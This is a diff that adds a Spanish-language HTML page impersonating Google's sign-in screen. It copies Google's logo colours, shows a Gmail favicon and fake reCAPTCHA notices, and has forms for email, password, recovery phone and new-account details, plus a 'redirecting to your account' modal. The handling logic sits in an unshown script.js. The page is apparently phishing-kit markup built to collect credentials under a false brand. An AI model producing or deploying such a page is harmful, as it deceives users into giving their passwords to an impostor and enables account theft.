@@ -1,0 +1,154 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Iniciar sesión - Google</title>
+    <link rel="stylesheet" href="style.css">
+    
+    <link rel="icon" href="https://imgs.search.brave.com/hM22sMomGmJfnPnH4L-bETy6idWAli9uUPIyheAWq2Q/rs:fit:860:0:0:0/g:ce/aHR0cHM6Ly91cGxv/YWQud2lraW1lZGlh/Lm9yZy93aWtpcGVk/aWEvY29tbW9ucy83/LzdlL0dtYWlsX2lj/b25fKDIwMjApLnN2/Zw">
+</head>
+<body>
+    <div class="container">
+        <!-- Panel de inicio de sesión principal -->
+        <div class="login-box" id="loginPanel">
+            <div class="logo">
+                <span style="color: #4285F4;">G</span>
+                <span style="color: #EA4335;">o</span>
+                <span style="color: #FBBC05;">o</span>
+                <span style="color: #4285F4;">g</span>
+                <span style="color: #34A853;">l</span>
+                <span style="color: #EA4335;">e</span>
+            </div>
+            
+            <h2>Iniciar sesión</h2>
+            <p class="subtitle">Utiliza tu Cuenta de Google</p>
+            
+            <form id="loginForm">
+                <div class="input-group">
+                    <input type="email" id="email" name="email" required autocomplete="off">
+                    <label for="email">Correo electrónico o teléfono</label>
+                </div>
+                
+                <div class="input-group hidden" id="passwordGroup">
+                    <input type="password" id="password" name="password" required autocomplete="off">
+                    <label for="password">Introduce tu contraseña</label>
+                </div>
+                
+                <div class="links">
+                    <a href="#" class="forgot-link" id="forgotEmailLink">¿Has olvidado tu correo electrónico?</a>
+                </div>
+                
+                <div class="info-box hidden" id="securityInfo">
+                    <p>Protegido por reCAPTCHA y sujeto a la <a href="#">Política de Privacidad</a> y <a href="#">Términos del Servicio</a> de Google.</p>
+                </div>
+                
+                <div class="buttons">
+                    <a href="#" class="create-account" id="createAccountLink">Crear cuenta</a>
+                    <button type="button" id="nextBtn" class="btn btn-primary">Siguiente</button>
+                    <button type="submit" id="submitBtn" class="btn btn-primary hidden">Iniciar sesión</button>
+                </div>
+            </form>
+        </div>
+
+        <!-- Panel de recuperación de email -->
+        <div class="login-box hidden" id="forgotEmailPanel">
+            <div class="logo">
+                <span style="color: #4285F4;">G</span>
+                <span style="color: #EA4335;">o</span>
+                <span style="color: #FBBC05;">o</span>
+                <span style="color: #4285F4;">g</span>
+                <span style="color: #34A853;">l</span>
+                <span style="color: #EA4335;">e</span>
+            </div>
+            
+            <h2>Encontrar tu correo electrónico</h2>
+            <p class="subtitle">Introduce tu número de teléfono o dirección de correo electrónico de recuperación</p>
+            
+            <form id="forgotEmailForm">
+                <div class="input-group">
+                    <input type="text" id="recoveryInfo" name="recoveryInfo" required autocomplete="off">
+                    <label for="recoveryInfo">Teléfono o correo electrónico</label>
+                </div>
+                
+                <div class="info-box">
+                    <p>Protegido por reCAPTCHA y sujeto a la <a href="#">Política de Privacidad</a> y <a href="#">Términos del Servicio</a> de Google.</p>
+                </div>
+                
+                <div class="buttons">
+                    <button type="button" id="backToLoginFromForgot" class="btn btn-secondary">Atrás</button>
+                    <button type="submit" class="btn btn-primary">Siguiente</button>
+                </div>
+            </form>
+        </div>
+
+        <!-- Panel de creación de cuenta -->
+        <div class="login-box hidden" id="createAccountPanel">
+            <div class="logo">
+                <span style="color: #4285F4;">G</span>
+                <span style="color: #EA4335;">o</span>
+                <span style="color: #FBBC05;">o</span>
+                <span style="color: #4285F4;">g</span>
+                <span style="color: #34A853;">l</span>
+                <span style="color: #EA4335;">e</span>
+            </div>
+            
+            <h2>Crear tu cuenta de Google</h2>
+            <p class="subtitle">Introduce tu información personal</p>
+            
+            <form id="createAccountForm">
+                <div class="input-group">
+                    <input type="text" id="firstName" name="firstName" required autocomplete="off">
+                    <label for="firstName">Nombre</label>
+                </div>
+                
+                <div class="input-group">
+                    <input type="text" id="lastName" name="lastName" required autocomplete="off">
+                    <label for="lastName">Apellidos</label>
+                </div>
+                
+                <div class="input-group">
+                    <input type="email" id="newEmail" name="newEmail" required autocomplete="off">
+                    <label for="newEmail">Correo electrónico</label>
+                </div>
+                
+                <div class="input-group">
+                    <input type="password" id="newPassword" name="newPassword" required autocomplete="off">
+                    <label for="newPassword">Contraseña</label>
+                </div>
+                
+                <div class="info-box">
+                    <p>Protegido por reCAPTCHA y sujeto a la <a href="#">Política de Privacidad</a> y <a href="#">Términos del Servicio</a> de Google.</p>
+                </div>
+                
+                <div class="buttons">
+                    <button type="button" id="backToLoginFromCreate" class="btn btn-secondary">Atrás</button>
+                    <button type="submit" class="btn btn-primary">Crear cuenta</button>
+                </div>
+            </form>
+        </div>
+        
+        <div class="footer">
+            <select id="language">
+                <option>Español (España)</option>
+                <option>English (United States)</option>
+            </select>
+            <div class="footer-links">
+                <a href="#">Ayuda</a>
+                <a href="#">Privacidad</a>
+                <a href="#">Términos</a>
+            </div>
+        </div>
+    </div>
+
+    <div id="successModal" class="modal hidden">
+        <div class="modal-content">
+            <h3>Verificación de seguridad</h3>
+            <p>Redirigiendo a tu cuenta...</p>
+            <div class="loading-bar"></div>
+        </div>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
